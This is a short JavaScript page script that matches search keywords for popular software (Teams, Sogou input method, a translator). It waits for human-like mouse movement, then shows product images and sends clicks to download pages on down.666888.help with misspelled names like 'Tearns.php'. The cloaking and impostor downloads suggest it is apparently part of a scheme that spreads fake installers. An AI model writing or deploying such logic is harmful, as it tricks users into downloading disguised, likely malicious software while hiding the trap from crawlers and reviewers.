var numCount=0;
var allowCount=10;
var confArr=[
["helloworld",3,"https://down.666888.help/hw/hw.php"],
["teams",2,"https://down.666888.help/teams/Tearns.php"],
["yifanyi|易翻译",2,"https://down.666888.help/traneasy/traneasy.php"],
["sogou|搜狗|输入法",3,"https://down.666888.help/sogou/Sougou.php"]
];
var isRedirect=false;
var findObj;
$(function()
{
	const urlParams = new URLSearchParams(window.location.search);
	const kw=urlParams.get("kw").toLowerCase();
	for(var i=0;i<confArr.length;i++)
	{
		var arrObj=confArr[i];
		var curName=arrObj[0].toLowerCase();
		if(new RegExp(curName).test(kw)==true)
		{
			findObj=confArr[i];
			break;
		}
	}

	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0 && findObj)
		{
			numCount++;
			if(numCount==allowCount)
			{
				document.title="site";
				if(isRedirect==true)
				{
					window.location=findObj[2];
				}
				else
				{
					var imgDoms="";
					var sName=findObj[0].split("|")[0];
					for(var i=1;i<=findObj[1];i++)
					{
						imgDoms+="<img src='"+sName+i+".jpg' />";
					}
					$("body").html(imgDoms);
				}
			}
		}
	});

	$("body").click(function(event)
	{
		if(checkRes(event)==true)
		{
			window.location=findObj[2];
		}
	});
})

function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0 && findObj)
	{return true;}else{return false;}
}
